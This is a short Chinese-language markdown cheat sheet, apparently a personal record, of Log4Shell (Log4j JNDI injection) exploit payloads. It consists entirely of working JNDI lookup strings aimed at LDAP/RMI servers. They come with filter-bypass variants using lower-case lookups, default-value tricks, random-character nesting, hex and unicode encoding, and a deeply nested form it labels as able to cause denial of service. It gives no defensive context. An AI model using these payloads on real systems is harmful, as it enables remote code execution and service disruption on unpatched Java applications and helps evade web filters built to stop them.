# 记录Log4jshell利用的工具和payload等
## poc

```
原始payload：${jndi:ldap|rmi://127.0.0.1:1389/ass}
关键函数绕过:  ${${lower:jn}${lower:d}i:${lower:rmi}://127.0.0.1:1389/poc}
横杆绕过：     ${::-j}${::-n}${::-d}${::-i}:rmi://127.0.0.1:1389/ass}
空格绕过：      ${j${::-}n${::-}d${::-}i:rmi://127.0.0.1:1389/ass}
任意字符任意长度：${j${amjy:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass}
${j${sdf:……%¥df:asdf:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass}
多层嵌套(可导致ddos)：${${${${${${::j}}}}}${${${${${::n}${::di}}}}}:ldap|rmi://127.0.0.1:1389/ass}
16进制编码绕过：
\x24{\x6a\x6e\x64\x69:\x6c\x64\x61\x70://1.1.1.1:1389/xx}
// jndi -> \x6a\x6e\x64\x69
// ldap -> \x6c\x64\x61\x70
// rmi -> \x72\x6d\x69       
unicode编码绕过：
\ud83d\ude04${jndi:ldap://1.1.1.1:1389}
```
